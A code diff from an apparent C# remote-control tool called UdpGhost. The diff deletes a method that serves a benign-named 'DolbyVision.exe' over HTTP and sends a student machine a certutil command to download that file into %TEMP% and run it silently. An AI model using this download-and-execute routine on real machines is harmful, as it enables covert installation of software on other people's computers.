@@ -84,31 +84,7 @@ namespace UdpGhost
         {
             var win = new MonitorWindow();
             win.Owner = this;
-            win.Show(); // 非模态，不阻塞主窗口
-        }
-        private async void Deploy_Click(object sender, RoutedEventArgs e)
-        {
-            string ip = GetTarget();
-            if (ip == null) { MessageBox.Show("请输入或选择学生端IP"); return; }
-            string senderPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "DolbyVision.exe");
-            if (!System.IO.File.Exists(senderPath))
-            {
-                MessageBox.Show("未找到 DolbyVision.exe，请放在 UdpGhost 同目录下");
-                return;
-            }
-            Log(GhostService.StartHttpServer(senderPath));
-            System.Threading.Thread.Sleep(500);
-            // 用certutil下载（Win7兼容），后台运行
-            string localIp = GhostService.GetLocalIP();
-            string cmd = "cmd /c certutil -urlcache -split -f http://" + localIp + ":8080/DolbyVision.exe %TEMP%\\DolbyVision.exe && start \"\" %TEMP%\\DolbyVision.exe";
-            Log(GhostService.SendCommand(ip, 4705, cmd));
-            Log("已发送部署命令，HTTP服务器保持运行，等待3秒确认...");
-            // 等3秒后扫描确认目标IP上线
-            await System.Threading.Tasks.Task.Delay(3000);
-            var senders = await System.Threading.Tasks.Task.Run(() => GhostService.ScanSenders());
-            bool found = senders.Exists(s => s.IP == ip);
-            if (found) Log($"部署成功：{ip} 已上线");
-            else Log($"部署失败：未检测到 {ip}，请手动确认（HTTP服务器仍在运行）");
+            win.Show();
         }
     }
 }
